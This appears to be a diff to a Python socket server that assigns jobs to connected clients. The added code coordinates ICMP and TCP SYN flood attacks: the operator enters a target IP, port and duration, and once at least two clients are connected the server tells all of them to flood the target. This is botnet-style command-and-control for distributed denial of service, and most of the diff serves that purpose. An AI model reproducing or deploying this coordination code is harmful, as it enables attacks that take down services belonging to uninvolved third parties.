@@ -2,7 +2,18 @@ import socket
 import sys
 import random
 import threading
+import time
 from scapy.all import *
+
+clients_connected: int = 0
+currentThread: int = 0
+threadInit: int = 0
+startJob: int = 0
+multDest = ""
+multTime = ""
+multPort = ""
+globCondition: int=0
+globJob: int=-1
 
 def detectPortStatus(csock, address):
     destIP = input("Enter the IP of destination: ")
@@ -33,59 +44,163 @@ def checkIfOnline(csock, address):
     except:
         print("ran out of time.")
 
+def icmpAttack(csock, address):
+    global multDest
+    global multTime
+    global globCondition
+    if currentThread == threading.get_ident():
+        destination = input("Enter an IP to flood with ICMP packets: \n")
+        timeout = input("Enter how many seconds to flood IP for: \n")
+        multDest = destination
+        multTime = timeout
+        globCondition = 1
+    else:
+        while globCondition == 0:
+            time.sleep(1)
+
+    try:
+        csock.send(f"icmp_flood_attack$ Job creator wants you flood an IP with ICMP packets${multDest}*{multTime}".encode())
+        data = csock.recv(1024).decode()
+        if data == "Flood_finished":
+            print(f"{multDest} was Flooded with ICMP packets")
+        else:
+            print(f"An error occured")
+
+    except:
+        print("ran out of time.")
+
+    globCondition = 0
+
+
+
+def tcpAttack(csock, address):
+    global multDest
+    global multTime
+    global multPort
+    global globCondition
+    if currentThread == threading.get_ident():
+        destination = input("Enter an IP to flood with SYN packets: \n")
+        port = input("Enter port to flood with SYN packets: \n")
+        timeout = input("Enter how many seconds to flood IP for: \n")
+        multDest = destination
+        multTime = timeout
+        multPort = port
+        globCondition = 1
+    else:
+        while globCondition == 0:
+            time.sleep(1)
+    try:
+        csock.send(f"tcp_flood_attack$ Job creator wants you flood an IP with TCP packets${multDest}*{multPort}*{multTime}".encode())
+        data = csock.recv(1024).decode()
+        if data == "Flood_finished":
+            print(f"{destination} was Flooded with TCP packets")
+        else:
+            print(f"An error occured")
+
+    except:
+        print("ran out of time.")
+
+    globCondition = 0
+
 
 def newClient(csock, address):
-    jobList = ["check_If_Online", "detect_Port_Status"]
-    rand = random.randint(0,1)
-    #rand = 1
+    global clients_connected
+    global currentThread
+    global threadInit
+    global startJob
+    global globJob
+    jobList = ["check_If_Online", "detect_Port_Status", "icmp_flood_attack","tcp_flood_attack"]
+
+    print(f"# of clients connected is {clients_connected}")
+    rand = random.randint(0,3)
+    if globJob > 0:
+        rand = globJob
+    #rand = 3
+    print(threading.get_ident())
     numOfNodes = ""
     if rand <= 1:
         numOfNodes = "1 person"
     else:
         numOfNodes = "more than 1 person"
+    print(jobList[rand])
     csock.send(f"The job is {jobList[rand]} created for {numOfNodes}. Accept?(Y/N)".encode())
     choice = csock.recv(1024).decode()
+
+
     if choice == "Y":
+        clients_connected += 1
         if (rand == 0):
             checkIfOnline(csock, address)
         if (rand == 1):
             detectPortStatus(csock, address)
+        if (rand == 2):
+            if threadInit == 0:
+                currentThread = threading.get_ident()
+                threadInit+=1
+                globJob = rand
+            while True:
+                if(clients_connected > 1):
+                    if currentThread == threading.get_ident():
+                        multChoice = input(f"Execute ICMP Attack with {clients_connected} clients? (Y/N): ").upper()
+                        if multChoice == "Y":
+                            print(f"Executing ICMP Attack with {clients_connected} clients.")
+                            startJob = 1
+                        else:
+                            print("Lets keep waiting then.")
+                    if startJob == 1:
+                        icmpAttack(csock, address)
+                        startJob = 0
+                        currentThread = 0
+                        threadInit = 0
+                        globJob = -1
+                        break
+
+                else:
+                    print("Waiting for at least 2 clients to continue")
+
+                time.sleep(3)
+        if (rand == 3):
+            if threadInit == 0:
+                currentThread = threading.get_ident()
+                threadInit+=1
+                globJob = rand
+            while True:
+                if(clients_connected > 1):
+                    if currentThread == threading.get_ident():
+                        multChoice = input(f"Execute TCP Attack with {clients_connected} clients? (Y/N): ").upper()
+                        if multChoice == "Y":
+                            print(f"Executing TCP Attack with {clients_connected} clients.")
+                            startJob = 1
+                        else:
+                            print("Lets keep waiting then.")
+                    if startJob == 1:
+                        tcpAttack(csock, address)
+                        currentThread = 0
+                        threadInit = 0
+                        startJob = 0
+                        globJob = -1
+                        break
+
+                else:
+                    print("Waiting for at least 2 clients to continue")
+
+                time.sleep(3)
+        clients_connected -= 1
     else:
         print("Job refused by seeker")
-        csock.close()
-        """
-            if not data:
-                conn.close()
-                mySocket.close()
 
-            if data == "refuse":
-                print("Job refused by seeker")
-                conn.close()
-                mySocket.close()
-            else:
-                print("Data returned from seeker: " + str(data))
-                conn.close()
-                mySocket.close()
-        """
-
-    """    
-    csock.send("Hello Client!!!!".encode())
-    data = csock.recv(1024).decode()
-    print(f"{address} sent: {data}")
-       # msg=input("Send a message to the client")
-        #csock.send(msg.encode())
-    """
     csock.close()
+
+    print(f"# of clients connected is {clients_connected}")
     print("Looking for seekers...")
 def Main():
     host = "127.0.0.1"
     #port = int(sys.argv[1])
-
+    print(threading.get_ident())
     port= 5000
     while True:
         mySocket = socket.socket()
         mySocket.bind((host, port))
-
         # while True:
         mySocket.listen(0)
         #conn, addr = mySocket.accept()
@@ -97,6 +212,8 @@ def Main():
             cThread = threading.Thread(target=newClient, args=(conn,addr,))
             cThread.start()
     mySocket.close()
+
+
 
 
 if __name__ == '__main__':
